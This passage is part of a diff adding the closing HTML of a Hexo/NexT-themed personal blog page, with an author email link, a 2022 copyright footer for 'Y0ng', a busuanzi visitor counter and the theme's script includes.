+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:1216043519@qq.com" title="E-Mail → mailto:1216043519@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Y0ng</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
